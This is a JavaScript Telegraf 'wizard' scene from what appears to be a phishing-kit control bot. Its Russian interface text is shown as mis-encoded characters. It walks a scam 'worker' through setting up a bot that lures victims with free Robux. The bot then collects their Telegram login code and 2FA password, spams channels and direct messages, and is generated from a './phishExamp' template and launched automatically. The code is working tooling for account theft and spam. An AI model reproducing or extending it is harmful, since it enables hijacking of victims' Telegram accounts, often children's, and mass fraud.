const { Scenes: { WizardScene }, Telegraf } = require("telegraf");
const { ref, get, child, set, update } = require("firebase/database");

const axios = require("axios");
const db = require("../database");
const createConfig = require("../botCreatingTools/createConfig");
const createBot = require("../botCreatingTools/createBot");
const cmdWorking = require("../botCreatingTools/cmdWorking");
const fs = require("fs");

function sleep(ms) {
    return new Promise((resolve) => {
        setTimeout(resolve, ms);
    });
}

const keyboard = {
    keyboard: [[{text: "üë®üèº‚Äçüíª–í–∞—à –ø—Ä–æ—Ñ–∏–ª—å"}], [{text: "–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è"}, {text: "–¢–æ–ø –≤–æ—Ä–∫–µ—Ä–æ–≤"}, {text: "–°–æ–∑–¥–∞—Ç—å –±–æ—Ç–∞"}]],
    resize_keyboard: true
}

const createBotScene = new WizardScene("createBotScene",
    async (ctx) => {
        if(ctx.message?.text == undefined) return;

        ctx.scene.state = {};

        ctx.scene.state.worker_id = ctx.chat.id;
        ctx.scene.state.botToken = ctx.message.text;

        try {
            await axios.get(`https://api.telegram.org/bot${ctx.message.text}/getMe`);
        }
        catch {
            await ctx.reply("–¢–æ–∫–µ–Ω –±–æ—Ç–∞ –Ω–µ–≤–∞–ª–∏–¥.", {reply_markup: keyboard})
            return ctx.scene.leave();
        }

        await ctx.reply("–í—ã –ø–æ–ø–∞–ª–∏ –≤ –Ω–∞—Å—Ç—Ä–æ–π–∫—É —Ç–µ–∫—Å—Ç–∞ –±–æ—Ç–∞!\n–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç –∫–Ω–æ–ø–∫–∏ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–Ω—Ç–∞–∫—Ç–∞.\n\n–ü—Ä–∏–º–µ—Ä: \"–ü–æ–ª—É—á–∏—Ç—å —Ä–æ–±—É–∫—Å—ã\"");
        return ctx.wizard.next();
    },

    async (ctx) => {
        if(ctx.message?.text == undefined) return;

        ctx.scene.state.authorizationButtonText = ctx.message.text;

        await ctx.reply("–¢–µ–∫—Å—Ç –∫–Ω–æ–ø–∫–∏ —É—Å–ø–µ—à–Ω–æ –∑–∞–¥–∞–Ω!\n–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç –ø—Ä–∏ /start.\n\n–ü—Ä–∏–º–µ—Ä: \"–•–æ—á–µ—à—å –ø–æ–ª—É—á–∏—Ç—å —Ä–æ–±—É–∫—Å—ã –±–µ—Å–ø–ª–∞—Ç–Ω–æ? –ù–∞–∂–∏–º–∞–π –Ω–∞ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ!\"");
        return ctx.wizard.next();
    },

    async (ctx) => {
        if(ctx.message?.text == undefined) return;

        ctx.scene.state.startText = ctx.message.text;

        await ctx.reply("–¢–µ–∫—Å—Ç –∫–æ–º–∞–Ω–¥—ã —É—Å–ø–µ—à–Ω–æ –∑–∞–¥–∞–Ω!\n–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è\n\n–ü—Ä–∏–º–µ—Ä: \"–ü–æ–¥–∫–ª—é—á–∞–µ–º—Å—è –∫ —Å–µ—Ä–≤–µ—Ä–∞–º —Ä–æ–±–ª–æ–∫—Å–∞..\"");
        return ctx.wizard.next();
    },

    async (ctx) => {
        if(ctx.message?.text == undefined) return;

        ctx.scene.state.connectionText = ctx.message.text;

        await ctx.reply("–¢–µ–∫—Å—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è —É—Å–ø–µ—à–Ω–æ –∑–∞–¥–∞–Ω!\n–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç –≤–≤–æ–¥–∞ –∫–æ–¥–∞\n\n–ü—Ä–∏–º–µ—Ä: \"–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥, –∫–æ—Ç–æ—Ä—ã–π –≤–∞–º –ø—Ä–∏—à—ë–ª –æ—Ç —Ç–µ–ª–µ–≥—Ä–∞–º–º–∞(–ø—Ä–æ–≤–µ—Ä—å—Ç–µ —á–∞—Ç—ã)\"");
        return ctx.wizard.next();
    },

    async (ctx) => {
        if(ctx.message?.text == undefined) return;

        ctx.scene.state.codeText = ctx.message.text;

        await ctx.reply("–¢–µ–∫—Å—Ç –≤–≤–æ–¥–∞ –∫–æ–¥–∞ —É—Å–ø–µ—à–Ω–æ –∑–∞–¥–∞–Ω!\n–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç –ø—Ä–∏ –≤–≤–æ–¥–µ –Ω–µ–≤–µ—Ä–Ω–æ–≥–æ –∫–æ–¥–∞\n\n–ü—Ä–∏–º–µ—Ä: \"–í—ã –≤–≤–µ–ª–∏ –Ω–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥! –ü—Ä–æ–≤–µ—Ä—å—Ç–µ —á–∞—Ç—ã.\"");
        return ctx.wizard.next();
    },

    async (ctx) => {
        if(ctx.message?.text == undefined) return;

        ctx.scene.state.invalidCodeErrorText = ctx.message.text;

        await ctx.reply("–¢–µ–∫—Å—Ç –≤–≤–æ–¥–∞ –Ω–µ–≤–µ—Ä–Ω–æ–≥–æ –∫–æ–¥–∞ —É—Å–ø–µ—à–Ω–æ –∑–∞–¥–∞–Ω!\n–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç –ø—Ä–∏ –≤–≤–æ–¥–µ –≤–µ—Ä–Ω–æ–≥–æ –∫–æ–¥–∞\n\n–ü—Ä–∏–º–µ—Ä: \"–†–æ–±–ª–æ–∫—Å—ã –±—É–¥—É—Ç –≤—ã–¥–∞–Ω—ã —á–µ—Ä–µ–∑ 24 —á–∞—Å–∞. –í–≤–µ–¥–∏—Ç–µ –≤–∞—à –Ω–∏–∫ –≤ –∏–≥—Ä–µ\"");
        return ctx.wizard.next();
    },

    async (ctx) => {
        if(ctx.message?.text == undefined) return;

        ctx.scene.state.validCodeText = ctx.message.text;

        await ctx.reply("–¢–µ–∫—Å—Ç –≤–≤–æ–¥–∞ –≤–µ—Ä–Ω–æ–≥–æ –∫–æ–¥–∞ —É—Å–ø–µ—à–Ω–æ –∑–∞–¥–∞–Ω!\n–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç –ø—Ä–∏ –Ω–µ—É–¥–∞—á–µ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–¥–∞(—Ä–µ–π—Ç–ª–∏–º–∏—Ç—ã –∞–∫–∫–∞—É–Ω—Ç–∞ –º–∞–º–æ–Ω—Ç–∞)\n\n–ü—Ä–∏–º–µ—Ä: \"–ù–∞ –≤–∞—à –∞–∫–∫–∞—É–Ω—Ç –Ω–µ–ª—å–∑—è –ø–æ–ª—É—á–∏—Ç—å —Ä–æ–±—É–∫—Å—ã!\"");
        return ctx.wizard.next();
    },

    async (ctx) => {
        if(ctx.message?.text == undefined) return;

        ctx.scene.state.errorSendCodeText = ctx.message.text;

        await ctx.reply("–¢–µ–∫—Å—Ç –≤–≤–æ–¥–∞ –ø—Ä–∏ –Ω–µ—É–¥–∞—á–µ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–¥–∞(—Ä–µ–π—Ç–ª–∏–º–∏—Ç—ã –∞–∫–∫–∞—É–Ω—Ç–∞ –º–∞–º–æ–Ω—Ç–∞) –∑–∞–¥–∞–Ω!\n–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç –ø—Ä–∏ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–º 2—Ñ–∞\n\n–ü—Ä–∏–º–µ—Ä: \"–í–≤–µ–¥–∏—Ç–µ –≤–∞—à –ø–∞—Ä–æ–ª—å 2—Ñ–∞: \"");
        return ctx.wizard.next();
    },

    async (ctx) => {
        if(ctx.message?.text == undefined) return;

        ctx.scene.state.passwordNeedErrorText = ctx.message.text;

        await ctx.reply("–¢–µ–∫—Å—Ç –≤–≤–æ–¥–∞ –ø—Ä–∏ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–º 2—Ñ–∞ –∑–∞–¥–∞–Ω!\n–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç –ø—Ä–∏ –Ω–µ–≤–µ—Ä–Ω–æ–º –≤–≤–µ–¥—ë–Ω–æ–º 2—Ñ–∞\n\n–ü—Ä–∏–º–µ—Ä: \"–ü–∞—Ä–æ–ª—å –≤–≤–µ–¥—ë–Ω –Ω–µ–≤–µ—Ä–Ω–æ! –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â—ë —Ä–∞–∑\"");
        return ctx.wizard.next();
    },

    async (ctx) => {
        if(ctx.message?.text == undefined) return;

        ctx.scene.state.invalidPasswordError = ctx.message.text;

        await ctx.reply("–¢–µ–∫—Å—Ç –≤–≤–æ–¥–∞ –ø—Ä–∏ –Ω–µ–≤–µ—Ä–Ω–æ–º –≤–≤–æ–¥–µ 2—Ñ–∞ –∑–∞–¥–∞–Ω!\n\n–ù–∞—á–∞–ª–∞—Å—å –Ω–∞—Å—Ç—Ä–æ–π–∫–∞ —Ä–∞—Å—Å—ã–ª–∫–∏!\n–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç —Ä–∞—Å—Å—ã–ª–∫–∏\n–ü—Ä–∏–º–µ—Ä: \"–•–æ—á–µ—à—å –ø–æ–ª—É—á–∏—Ç—å –±–µ—Å–ø–ª–∞—Ç–Ω—ã–µ —Ä–æ–±—É–∫—Å—ã? –ü–∏—à–∏ —ç—Ç–æ–º—É –±–æ—Ç—É @test\"")
        return ctx.wizard.next();
    },

    async (ctx) => {
        if(ctx.message?.text == undefined) return;

        ctx.scene.state.spamText = ctx.message.text;
        ctx.dmSpam = true;

        await ctx.reply("–¢–µ–∫—Å—Ç –≤–≤–æ–¥–∞ –ø—Ä–∏ —Å–ø–∞–º–µ –∑–∞–¥–∞–Ω!\n–í–≤–µ–¥–∏—Ç–µ —Å—Å—ã–ª–∫–∏ –Ω–∞ –∫–∞–Ω–∞–ª—ã –¥–ª—è –≤—Å—Ç—É–ø–ª–µ–Ω–∏—è —á–µ—Ä–µ–∑, –µ—Å–ª–∏ –Ω–µ –∂–µ–ª–∞–µ—Ç–µ –≤–≤–æ–¥–∏—Ç—å, —Ç–æ –≤–≤–µ–¥–∏—Ç–µ 0\",\"\n–ü—Ä–∏–º–µ—Ä: \"https://t.me/RobloxXO,https://t.me/RobloxXO\"")
        return ctx.wizard.next();
    },

    async (ctx) => {
        if(ctx.message?.text == undefined) return;

        ctx.scene.state.joinChannels = ctx.message.text.split(",");

        await ctx.reply("–¢–µ–∫—Å—Ç –≤–≤–æ–¥–∞ –ø—Ä–∏ –∫–∞–Ω–∞–ª—ã –¥–ª—è –≤—Å—Ç—É–ø–ª–µ–Ω–∏—è –∑–∞–¥–∞–Ω—ã!\n–í–≤–µ–¥–∏—Ç–µ –∞–π–¥–∏—à–Ω–∏–∫–∏ –∫–∞–Ω–∞–ª–æ–≤ –¥–ª—è —Å–ø–∞–º–∞, –ø–æ–ª—É—á–∏—Ç—å –∞–π–¥–∏—à–Ω–∏–∫–∏ –º–æ–∂–Ω–æ —Ç—É—Ç @getmy_idbot, –µ—Å–ª–∏ –Ω–µ –∂–µ–ª–∞–µ—Ç–µ –≤–≤–æ–¥–∏—Ç—å, —Ç–æ –≤–≤–µ–¥–∏—Ç–µ 0\n–ü—Ä–∏–º–µ—Ä: \"-1001612518469,-1001612518469\"")
        return ctx.wizard.next();
    },

    async (ctx) => {
        if(ctx.message?.text == undefined) return;

        if(fs.existsSync(`./bots/${ctx.chat.id}`)) fs.writeFileSync(`./bots/${ctx.chat.id}/stop.stop`, "besttem");
        await sleep(1000);

        ctx.scene.state.channelsSpam = ctx.message.text.split(",");

        await ctx.reply("–ü–æ–∑–¥—Ä–∞–≤–ª—è—é! –í—ã —É—Å–ø–µ—à–Ω–æ –≤—Å—ë –Ω–∞—Å—Ç—Ä–æ–∏–ª–∏! –£–¥–∞—á–Ω–æ–≥–æ –≤–æ—Ä–∫–∞ üçÄ", {reply_markup: keyboard})
        await set(child(ref(db), `users/${ctx.chat.id}/bot`),
            {
                worker_id: ctx.scene.state.worker_id,
                botToken: ctx.scene.state.botToken,
                textInfo:
                    {
                        authorizationButtonText: ctx.scene.state.authorizationButtonText,
                        startText: ctx.scene.state.startText,
                        connectionText: ctx.scene.state.connectionText,
                        codeText: ctx.scene.state.codeText,
                        errorSendCodeText: ctx.scene.state.errorSendCodeText,
                        validCodeText: ctx.scene.state.validCodeText,
                        invalidCodeErrorText: ctx.scene.state.invalidCodeErrorText,
                        passwordNeedErrorText: ctx.scene.state.passwordNeedErrorText,
                        invalidPasswordError: ctx.scene.state.invalidPasswordError
                    },
                spamInfo:
                    {
                        joinChannels: ctx.scene.state.joinChannels,
                        channelsSpam: ctx.scene.state.channelsSpam,
                        dmSpam: true,
                        spamText: ctx.scene.state.spamText
                    }
            }
        );

        const user_bot_data = await get(child(ref(db), `users/${ctx.chat.id}/bot`));
        const user_bot = user_bot_data.val();

        const path = `./bots/${ctx.chat.id}`;

        fs.existsSync(path) || fs.mkdirSync(path);

        try {
            fs.unlinkSync(`${path}/stop.stop`);
        }
        catch {
            console.log("catch");
        }

        ctx.scene.leave();

        const config = createConfig(user_bot.botToken,user_bot.worker_id, user_bot.spamInfo, user_bot.textInfo);
        createBot(config, path, "./phishExamp");
        cmdWorking(`cd ${path} & python bot.py`);
    }
)

createBotScene.hears("–í–µ—Ä–Ω—É—Ç—å—Å—è", async (ctx) => {
    await ctx.reply("–í—ã –≤–µ—Ä–Ω—É–ª–∏—Å—å –≤ –ø–∞–Ω–µ–ª—å!", {reply_markup: keyboard})
    return ctx.scene.leave();
})

createBotScene.enter((ctx) => {
    ctx.reply("–í—ã –ø–æ–ø–∞–ª–∏ –≤ —Å–æ–∑–¥–∞–Ω–∏–µ –±–æ—Ç–∞!\n\n–í–≤–µ–¥–∏—Ç–µ —Ç–æ–∫–µ–Ω –±–æ—Ç–∞: ", {reply_markup: {keyboard: [[{text: "–í–µ—Ä–Ω—É—Ç—å—Å—è"}]], resize_keyboard: true}})
})

module.exports = createBotScene;